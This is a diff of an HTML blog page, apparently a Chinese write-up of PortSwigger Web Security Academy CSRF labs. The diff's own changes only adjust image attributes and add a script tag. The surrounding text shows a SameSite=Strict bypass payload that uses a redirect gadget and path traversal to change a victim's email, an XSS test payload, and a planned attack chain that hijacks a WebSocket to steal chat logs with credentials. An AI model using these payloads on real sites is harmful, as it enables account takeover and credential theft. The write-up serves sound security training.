 <h3 id="0x08-通过客户端重定向绕过-SameSite-Strict-策略"><a href="#0x08-通过客户端重定向绕过-SameSite-Strict-策略" class="headerlink" title="0x08.通过客户端重定向绕过 SameSite Strict 策略"></a>0x08.通过客户端重定向绕过 SameSite Strict 策略</h3><p>本实验的修改邮箱功能存在跨站请求伪造（CSRF）漏洞。要完成本实验，你需要实施一次 CSRF 攻击，篡改受害者的邮箱地址。你需要使用平台提供的漏洞攻击服务器来存放你的攻击代码。<br>你可以使用以下账号密码登录自己的账户：用户名：wiener 密码：peter<br>你无法注册已经被其他用户占用的邮箱地址。如果你在测试攻击载荷的过程中改动了自己的邮箱，请务必在发给受害者的最终攻击载荷里使用一个不一样的邮箱地址</p>
-<p>抓取邮箱更新的数据包：请求里没有任何随机 Token、验证码，无 CSRF 防护<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_22.png" alt="在这里插入图片描述"></p>
-<p><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_23.png" alt="在这里插入图片描述"></p>
+<p>抓取邮箱更新的数据包：请求里没有任何随机 Token、验证码，无 CSRF 防护<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_22.png" alt="CSRF基础·图22"></p>
+<p><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_23.png" alt="CSRF基础·图23"></p>
 <p><strong><code>SameSite=Strict 铁规则</code></strong><br>只要是跨站发起的请求，浏览器任何情况<code>都不</code>携带会话 Cookie，普通 document.location、a 标签跨站跳转<code>全部失效</code>。</p>
 <table>
 <thead>
@@ -583,8 +472,8 @@ MathJax = {
 </blockquote>
 </blockquote>
 <p>由这个利用过程可知：我们需要在<strong>目标网站中寻找一个自带客户端 JS 自动跳转、且参数可控的页面作为跳板（Gadget）</strong>，先跨站载入该页面，再依靠页面自身的 JS 完成站内跳转，从而绕过 SameSite&#x3D;Strict 限制携带会话 Cookie。</p>
-<p>在随便一篇blog下发表评论<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_24.png" alt="在这里插入图片描述"></p>
-<p>放包之后，这个页面，但最终会自动重定向到blog中<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_25.png" alt="在这里插入图片描述"></p>
+<p>在随便一篇blog下发表评论<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_24.png" alt="CSRF基础·图24"></p>
+<p>放包之后，这个页面，但最终会自动重定向到blog中<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_25.png" alt="CSRF基础·图25"></p>
 <p><code>https://0a0d0074033b911680c9037a00c00067.web-security-academy.net/post/comment/confirmation?postId=3</code><br><code>https://0a0d0074033b911680c9037a00c00067.web-security-academy.net/post/3</code></p>
 <p>这个评论确认页就是我们要的 Gadget：</p>
 <ul>
@@ -613,7 +502,7 @@ MathJax = {
 <p><strong><code>后续代码彻底死亡</code></strong>：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">        history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);</span><br><span class="line">        document.forms[0].submit();</span><br><span class="line">      &#125;, 1000);</span><br></pre></td></tr></table></figure>
 
-<p>尝试使用get方法（数据包转换方法）：发现可行<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_26.png" alt="在这里插入图片描述"></p>
+<p>尝试使用get方法（数据包转换方法）：发现可行<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_26.png" alt="CSRF基础·图26"></p>
 <p>最终payload</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://0a0d0074033b911680c9037a00c00067.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@dontwannacry.com%26submit=1&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -670,20 +559,20 @@ MathJax = {
 <td align="left">❌ 任何跨站请求都不带</td>
 </tr>
 </tbody></table>
-<p>使用WebSocket协议<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_27.png" alt="在这里插入图片描述"></p>
-<p>通信内容<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_28.png" alt="在这里插入图片描述"></p>
-<p>点击chat页面，找到与chat有关的自动加载的js<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_29.png" alt="在这里插入图片描述"></p>
-<p>放到repeater重发器，修改路径发送<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_30.png" alt="在这里插入图片描述"></p>
-<p>访问一下，是一个后台登录<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_31.png" alt="在这里插入图片描述"></p>
+<p>使用WebSocket协议<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_27.png" alt="CSRF基础·图27"></p>
+<p>通信内容<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_28.png" alt="CSRF基础·图28"></p>
+<p>点击chat页面，找到与chat有关的自动加载的js<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_29.png" alt="CSRF基础·图29"></p>
+<p>放到repeater重发器，修改路径发送<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_30.png" alt="CSRF基础·图30"></p>
+<p>访问一下，是一个后台登录<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_31.png" alt="CSRF基础·图31"></p>
 <p>要主要，此题的cookie策略是 <strong>SameSite&#x3D;Strict</strong>  ，而我们的目标是钓鱼然后带出cookie，整理一下思路：</p>
 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">目标：窃取受害者的聊天记录（含登录凭证）</span><br><span class="line"></span><br><span class="line">问题：WebSocket /chat 需要 session Cookie 才能获取聊天记录</span><br><span class="line">      ↓</span><br><span class="line">      Cookie 设了 SameSite=Strict</span><br><span class="line">      ↓</span><br><span class="line">      从 exploit server 直接建 WebSocket → 跨站 → 不带 Cookie → 失败</span><br><span class="line">      ↓</span><br><span class="line">绕过：CMS 子域和主站是 同站</span><br><span class="line">      ↓</span><br><span class="line">      从 CMS 子域建 WebSocket → 同站 → 带 Cookie → 成功！</span><br><span class="line">      ↓</span><br><span class="line">      但怎么在 CMS 子域上执行我们的 JS？</span><br><span class="line">      ↓</span><br><span class="line">      CMS 子域的 /login 页面大概率有 XSS 漏洞</span><br></pre></td></tr></table></figure>
 
 
 
-<p>测试xss<br><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_32.png" alt="在这里插入图片描述"></p>
+<p>测试xss<br><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_32.png" alt="CSRF基础·图32"></p>
 <p>这是一个被p标片包裹者，script标签在其中是可以正常执行的，例如payload：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/CSRF%E5%9F%BA%E7%A1%80/image_33.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/CSRF%E5%9F%BA%E7%A1%80/image_33.png" alt="CSRF基础·图33"></p>
 <p>已经确定存在反射型xss的思路：</p>
 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">目标：窃取受害者的聊天记录（含登录凭证）</span><br><span class="line"></span><br><span class="line">问题：WebSocket /chat 需要 session Cookie 才能获取聊天记录</span><br><span class="line">      ↓</span><br><span class="line">      主站 Cookie 设了 SameSite=Strict</span><br><span class="line">      ↓</span><br><span class="line">      从 exploit server 直接建 WebSocket → 跨站 → 不带 Cookie → 失败</span><br><span class="line">      ↓</span><br><span class="line">绕过第一步：CMS 子域和主站是 同站（eTLD+1 都是 web-security-academy.net）</span><br><span class="line">      ↓</span><br><span class="line">      从 CMS 子域建 WebSocket → 同站 → 带 Cookie → 成功！</span><br><span class="line">      ↓</span><br><span class="line">绕过第二步：怎么在 CMS 子域上执行我们的 JS？</span><br><span class="line">      ↓</span><br><span class="line">      CMS 的 /login 页面存在反射型 XSS（username 参数未过滤直接回显）</span><br><span class="line">      ↓</span><br><span class="line">      exploit server 自动提交表单到 CMS /login → XSS 触发 → JS 在 CMS 域执行</span><br><span class="line">      ↓</span><br><span class="line">攻击链：exploit server → POST 表单到 CMS /login → XSS → WebSocket 到主站 → 窃取聊天记录 → 发送到 Collaborator</span><br></pre></td></tr></table></figure>
 
@@ -901,6 +790,7 @@ MathJax = {
 <script src="/js/bootstrap.min.js"></script>
 <script src="/js/main.js"></script>
 <script src="/js/toc.js"></script>
+<script src="/js/reading.js"></script>
 <script src="/js/copy-code.js"></script>
 
    <script type="text/javascript">
